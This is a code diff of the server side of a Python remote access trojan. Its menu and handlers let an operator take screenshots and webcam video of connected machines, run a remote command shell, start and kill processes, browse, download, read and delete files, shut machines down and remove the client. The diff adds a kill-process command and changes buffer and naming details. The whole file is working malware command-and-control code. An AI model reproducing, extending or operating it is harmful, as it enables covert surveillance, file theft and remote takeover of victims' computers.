@@ -5,8 +5,8 @@ import time
 import os
 import re
 
-PORT = 5005
-BUFFER = 8192
+port = 5005
+buffer = 16384
 
 clients = []
 clientInfo = []
@@ -15,7 +15,7 @@ table = PrettyTable()
 table.field_names = ["ID", "Computer", "IP Address", "Username", "System", "File"]
 
 send = lambda data: client.send(bytes(data, "utf-8"))
-recv = lambda buffer: client.recv(BUFFER)
+recv = lambda buf: client.recv(buffer)
 
 def sendAll(data):
     if (isinstance(data, bytes)):
@@ -42,24 +42,24 @@ def recvAll_Verbose(bufsize):
     send("success")
     while (len(data) < int(bufsize)):
         data += recv(int(bufsize))
-        print("Receiving: {:,} Bytes\r".format(len(data)), end="")
+        print("Receiving: {:,} / {:,} Bytes\r".format(len(data), int(bufsize)), end="")
     return data
 
 def conn_stream():
-    if (b"success" in client.recv(BUFFER)):
+    if (b"success" in client.recv(buffer)):
         return True
 
 def RemoteConnect():
     objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    objSocket.bind(("0.0.0.0", PORT))
+    objSocket.bind(("0.0.0.0", port))
     objSocket.listen(socket.SOMAXCONN)
 
     while (True):
         try:
             conn, address = objSocket.accept()
             clients.append(conn)
-            clientInfo.append([address, str(conn.recv(BUFFER), "utf-8").split("\n")])
+            clientInfo.append([address, str(conn.recv(buffer), "utf-8").split("\n")])
 
         except socket.error:
             objSocket.close()
@@ -96,6 +96,7 @@ def ClientCommands():
     print("[-vrt] View Running Tasks             |")
     print("[-idt] Idle Time                      |")
     print("[-stp] Start Process                  |")
+    print("[-klp] Kill Process                   |")
     print("[-rms] Remote CMD                     |")
     print("[-sdc] Shutdown Computer              |")
     print("[-rsc] Restart Computer               |")
@@ -119,23 +120,23 @@ def VBSMessageBox():
         print("[-] Maximum Length: 1000 Characters")
 
     elif not (len(message) <= 0):
-        client.send(b"msgbox")
+        send("msgbox")
         if (conn_stream()):
-            client.send(bytes(message, "utf-8"))
+            send(message)
 
-    print(str(client.recv(BUFFER), "utf-8") + "\n")
+    print(str(recv(buffer), "utf-8") + "\n")
 
 def CaptureScreenshot():
     send("screenshot")
 
-    if not (str(recv(BUFFER), "utf-8") == "valid"):
+    if not (str(recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to Capture Screenshot\n")
         return
 
     start = time.time()
-    print("Capturing Screenshot...")
+    print("\nScreenshot Captured")
     try:
-        fileContent = recvAll_Verbose(recv(BUFFER))
+        fileContent = recvAll_Verbose(recv(buffer))
         with open(time.strftime(f"{PC_Name}-%Y-%m-%d-%H%M%S.png"), "wb") as ImageFile:
             ImageFile.write(fileContent)
 
@@ -182,19 +183,19 @@ def CaptureWebcam():
         send("0")
         return
 
-    if not (str(recv(BUFFER), "utf-8") == "valid"):
+    if not (str(recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to Capture Webcam\n")
         return
 
     start = time.time()
     print("\nWebcam Captured")
     try:
-        fileContent = recvAll_Verbose(recv(BUFFER))
+        fileContent = recvAll_Verbose(recv(buffer))
         with open(time.strftime(f"{PC_Name}-%Y-%m-%d-%H%M%S.avi"), "wb") as ImageFile:
             ImageFile.write(fileContent)
 
         end = time.time()
-        print("\n\nCapture has been Received\nSize: " +
+        print("\n\nVideo has been Received\nSize: " +
             "{:,.2f} kilobytes ~ ({:,} bytes)\nTime Duration: [{:.2f}s]\n".format(
             len(fileContent) / 1024, len(fileContent), end - start))
 
@@ -231,27 +232,35 @@ def SystemInformation():
 
 def ViewTasks():
     send("tasklist")
-    print(str(recvAll(recv(BUFFER)), "utf-8") + "\n")
+    print(str(recvAll(recv(buffer)), "utf-8"))
 
 def IdleTime():
     send("idletime")
-    print(str(recv(BUFFER), "utf-8") + "\n")
+    print(str(recv(buffer), "utf-8") + "\n")
 
 def StartProcess():
     process = input("\nRemote File Path: ").strip()
-    send("process")
+    send("stprocess")
     if (conn_stream()):
         send(process)
 
-    if not (str(recv(BUFFER), "utf-8") == "valid"):
+    if not (str(recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote File\n")
         return
 
-    print(str(recv(BUFFER), "utf-8") + "\n")
+    print(str(recv(buffer), "utf-8") + "\n")
+
+def KillProcess():
+    process = input("\nTask to Kill: ").strip()
+    send("klprocess")
+    if (conn_stream()):
+        send(process)
+
+    print(str(recvAll(recv(buffer)), "utf-8"))
 
 def RemoteCMD():
     send("remote")
-    remoteDirectory = str(recv(BUFFER), "utf-8")
+    remoteDirectory = str(recv(buffer), "utf-8")
 
     while (True):
         command = input(f"\n({IP_Address} ~ {remoteDirectory})> ").strip().lower()
@@ -269,7 +278,7 @@ def RemoteCMD():
 
         elif (len(command) > 0):
             send(command)
-            output = str(recvAll(recv(BUFFER)), "utf-8")
+            output = str(recvAll(recv(buffer)), "utf-8")
 
             if (len(output) == 0):
                 print("No Output ~ Command Executed")
@@ -290,7 +299,7 @@ def LockComputer():
 
 def CurrentDirectory():
     send("directory")
-    print(str(recv(BUFFER), "utf-8").replace("\\", "/") + "\n")
+    print(str(recv(buffer), "utf-8").replace("\\", "/") + "\n")
 
 def ViewFiles():
     directory = input("\nRemote Folder [-filter]: ").strip()
@@ -298,11 +307,11 @@ def ViewFiles():
     if (conn_stream()):
         send(directory)
 
-    if not (str(recv(BUFFER), "utf-8") == "valid"):
+    if not (str(recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote Directory\n")
         return
 
-    clientFiles = recvAll(recv(BUFFER)).split(b"\n")
+    clientFiles = recvAll(recv(buffer)).split(b"\n")
     fileCount = -1
     files = str()
 
@@ -345,13 +354,13 @@ def ReceiveFile():
     if (conn_stream()):
         send(filePath)
 
-    if not (str(recv(BUFFER), "utf-8") == "valid"):
+    if not (str(recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote File\n")
         return
         
     start = time.time()
     try:
-        fileContent = recvAll_Verbose(recv(BUFFER))
+        fileContent = recvAll_Verbose(recv(buffer))
         fileName = filePath.split("\\")[-1]
 
         with open(fileName, "wb") as RemoteFile:
@@ -369,13 +378,13 @@ def ReadFile():
     if (conn_stream()):
         send(filePath)
 
-    if not (str(recv(BUFFER), "utf-8") == "valid"):
+    if not (str(recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote File\n")
         return
         
     start = time.time()
     try:
-        fileContent = recvAll_Verbose(recv(BUFFER))
+        fileContent = recvAll_Verbose(recv(buffer))
         fileName = filePath.split("\\")[-1]
 
         end = time.time()
@@ -402,7 +411,7 @@ def MoveFile():
     if (conn_stream()):
         send(remoteDirectory)
 
-    clientResponse = str(recv(BUFFER), "utf-8")
+    clientResponse = str(recv(buffer), "utf-8")
     if (clientResponse == "invalid-file"):
         print("[!] Unable to find Remote File\n")
         return
@@ -419,11 +428,11 @@ def DeleteFile():
     if (conn_stream()):
         send(filePath)
 
-    if not (str(recv(BUFFER), "utf-8") == "valid"):
+    if not (str(recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote File\n")
         return
 
-    print(str(recv(BUFFER), "utf-8") + "\n")
+    print(str(recv(buffer), "utf-8") + "\n")
 
 def DeleteDirectory():
     directory = input("\nRemote Directory: ").strip()
@@ -431,11 +440,11 @@ def DeleteDirectory():
     if (conn_stream()):
         send(directory)
 
-    if not (str(recv(BUFFER), "utf-8") == "valid"):
+    if not (str(recv(buffer), "utf-8") == "valid"):
         print("[!] Unable to find Remote Directory\n")
         return
 
-    print(str(recv(BUFFER), "utf-8") + "\n")
+    print(str(recv(buffer), "utf-8") + "\n")
 
 def adjustTable():
     table.clear_rows()
@@ -472,7 +481,7 @@ def SelectConnection():
                 for client in clients:
                     try:
                         client.send(b"test")
-                        if (client.recv(BUFFER) == b"success"):
+                        if (client.recv(buffer) == b"success"):
                             continue
 
                     except ConnectionResetError:
@@ -496,7 +505,7 @@ def SelectConnection():
                 client = clients[connection]
                 try:
                     client.send(b"test")
-                    if (client.recv(BUFFER) == b"success"):
+                    if (client.recv(buffer) == b"success"):
                         RemoteControl(connection)
 
                 except ConnectionResetError:
@@ -525,7 +534,7 @@ def SelectConnection():
                 if (input(f"Delete Program off Client {clients.index(client)}'s Computer? (y/n): ").lower().strip() == "y"):
                     try:
                         client.send(b"delself")
-                        if (str(client.recv(BUFFER), "utf-8") == "success"):
+                        if (str(client.recv(buffer), "utf-8") == "success"):
                             print(f"Program has been Deleted off Remote Computer ~ [{client.getpeername()[0]}]")
 
                     except ConnectionResetError:
@@ -574,10 +583,10 @@ def RemoteControl(connection):
     PC_Username = clientInfo[connection][1][1]
     PC_System = clientInfo[connection][1][2]
 
-    print(f"Connection Established: {PC_Name}/{IP_Address} ({clients.index(client)})\n")
+    print(f"Connected: {PC_Name}/{IP_Address} ({clients.index(client)})\n")
     while (True):
         try:
-            command = input(f"({IP_Address})> ").lower().strip()
+            command = input(f"({PC_Name})> ").lower().strip()
             if (command == "clear" or command == "cls"):
                 os.system("clear" if os.name == "posix" else "cls")
 
@@ -611,6 +620,9 @@ def RemoteControl(connection):
 
             elif (command == "-stp"):
                 StartProcess()
+
+            elif (command == "-klp"):
+                KillProcess()
 
             elif (command == "-rms"):
                 RemoteCMD()
@@ -650,10 +662,6 @@ def RemoteControl(connection):
 
         except KeyboardInterrupt:
             print("\n[Keyboard Interrupted ~ Connection Appended]")
-            break
-
-        except BrokenPipeError:
-            print("\n[!] Client Timed Out ~ [Retry Connecting]")
             break
 
         except Exception as e:
